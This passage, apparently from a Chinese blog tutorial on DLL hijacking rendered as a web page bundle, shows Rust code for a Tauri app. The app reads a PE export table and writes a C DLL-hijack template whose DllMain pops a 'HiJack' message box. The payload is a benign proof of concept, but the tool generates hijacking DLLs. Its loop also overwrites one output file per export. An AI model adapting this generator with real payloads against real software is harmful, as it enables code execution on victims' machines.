        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>second_pos<span class="token punctuation">)</span> <span class="token operator">=</span> base_name<span class="token punctuation">.</span><span class="token function">rfind</span><span class="token punctuation">(</span><span class="token char">&#39;@&#39;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>base_name<span class="token punctuation">[</span><span class="token punctuation">..</span>second_pos<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>base_name<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token class-name">None</span>
<span class="token punctuation">}</span>

<span class="token keyword">fn</span> <span class="token function-definition function">hijack</span><span class="token punctuation">(</span>file_path<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">String</span><span class="token punctuation">{</span>
    <span class="token keyword">let</span> _templete <span class="token operator">=</span> <span class="token string">r#&quot;
                    #include &quot;pch.h&quot;
                    #include &lt;stdlib.h&gt;
                    #include &lt;windows.h&gt;

                    EXPORTS_REPLACE

                    BOOL APIENTRY DllMain(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)
                    {
                        switch (ul_reason_for_call)
                        {
                        case DLL_PROCESS_ATTACH:
                            MessageBoxA(NULL, &quot;HiJack&quot;, &quot;DLL_DllMain&quot;, 0);
                            break;
                        case DLL_THREAD_ATTACH:
                            break;
                        case DLL_THREAD_DETACH:
                            break;
                        case DLL_PROCESS_DETACH:
                            break;
                        }
                        return TRUE;
                    }
                    &quot;#</span><span class="token punctuation">;</span>
    <span class="token comment">// 获取PE导出函数 __declspec(dllexport) void __stdcall</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> file <span class="token operator">=</span> <span class="token class-name">File</span><span class="token punctuation">::</span><span class="token function">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">&quot;Failed Open File&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 读取文件内容</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> buffer <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    file<span class="token punctuation">.</span><span class="token function">read_to_end</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> buffer<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">&quot;Failed Read Buffer&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 解析 PE 文件</span>
    <span class="token keyword">let</span> function_names <span class="token operator">=</span> <span class="token function">parse_pe_export_table</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 获取导出表</span>
    <span class="token keyword">for</span> name <span class="token keyword">in</span> function_names <span class="token punctuation">{</span>
        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">&quot;{}&quot;</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">match</span> <span class="token function">extract_base_name</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>name<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">Some</span><span class="token punctuation">(</span>base_name<span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">&quot;Extracted base name: {}&quot;</span><span class="token punctuation">,</span> base_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 替换EXPORTS</span>
                <span class="token keyword">let</span> <span class="token keyword">mut</span> newExport <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">&quot;__declspec(dllexport) void __stdcall  &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                newExport<span class="token punctuation">.</span><span class="token function">push_str</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>base_name<span class="token punctuation">)</span><span class="token punctuation">;</span>
                newExport<span class="token punctuation">.</span><span class="token function">push_str</span><span class="token punctuation">(</span><span class="token string">&quot;(void){}&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">&quot;Extracted base New name: {}&quot;</span><span class="token punctuation">,</span> newExport<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 生成C代码</span>
                <span class="token comment">// 替换模板中的 EXPORTS_REPLACE</span>
                <span class="token keyword">let</span> result <span class="token operator">=</span> _templete<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">&quot;EXPORTS_REPLACE&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>newExport<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">&quot;HiJack C File \\n {}&quot;</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 写入文件</span>
                <span class="token keyword">let</span> output_path <span class="token operator">=</span> <span class="token string">&quot;hijack.c&quot;</span><span class="token punctuation">;</span>
                <span class="token keyword">let</span> <span class="token keyword">mut</span> output_file <span class="token operator">=</span> <span class="token class-name">File</span><span class="token punctuation">::</span><span class="token function">create</span><span class="token punctuation">(</span>output_path<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">&quot;Failed to create output file&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                output_file<span class="token punctuation">.</span><span class="token function">write_all</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">&quot;Failed to write to output file&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token class-name">None</span> <span class="token operator">=&gt;</span> <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">&quot;Could not extract the base name.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 返回OK</span>
    <span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">&quot;Generate Successfully&quot;</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">// Learn more about Tauri commands at https://tauri.app/v1/guides/features/command</span>
<span class="token attribute attr-name">#[tauri::command]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">hijack_dll</span><span class="token punctuation">(</span>file<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">String</span> <span class="token punctuation">{</span>
    <span class="token function">hijack</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token namespace">tauri<span class="token punctuation">::</span></span><span class="token class-name">Builder</span><span class="token punctuation">::</span><span class="token function">default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">invoke_handler</span><span class="token punctuation">(</span><span class="token namespace">tauri<span class="token punctuation">::</span></span><span class="token macro property">generate_handler!</span><span class="token punctuation">[</span>hijack_dll<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token namespace">tauri<span class="token punctuation">::</span></span><span class="token macro property">generate_context!</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">&quot;error while running tauri application&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,3);function y(w,h){const a=l("ExternalLinkIcon");return o(),c("div",null,[u,n("h2",k,[r,s(),n("a",d,[s("如何制作"),t(a)])]),v,n("h2",m,[b,s(),n("a",_,[s("DLL劫持"),t(a)])]),f])}const D=e(i,[["render",y],["__file","bw.html.vue"]]);export{D as default};
